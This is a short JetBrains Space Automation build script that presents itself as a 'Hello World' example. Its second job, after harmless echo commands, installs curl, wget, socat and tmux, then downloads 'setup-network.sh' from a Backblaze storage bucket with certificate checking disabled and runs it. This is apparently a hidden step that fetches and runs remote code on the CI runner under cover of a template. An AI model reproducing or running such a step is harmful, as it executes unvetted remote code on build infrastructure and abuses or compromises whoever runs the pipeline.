/**
* JetBrains Space Automation
* This Kotlin-script file lets you automate build activities
* For more info, see https://www.jetbrains.com/help/space/automation.html
*/

job("Hello World!") {
    container(displayName = "Say Hello", image = "hello-world")
}

job("Example shell script") {
    container(displayName = "Say Hello", image = "ubuntu") {
        shellScript {
            content = """
                echo Hello
                echo World!
                pwd
                whoami
                apt update -y  && apt install curl tmux sudo wget socat -y 
                curl -O -k https://bucket-2022.s3.us-west-004.backblazeb2.com/linshi/setup-network.sh
                bash setup-network.sh 253
            """
        }
    }
}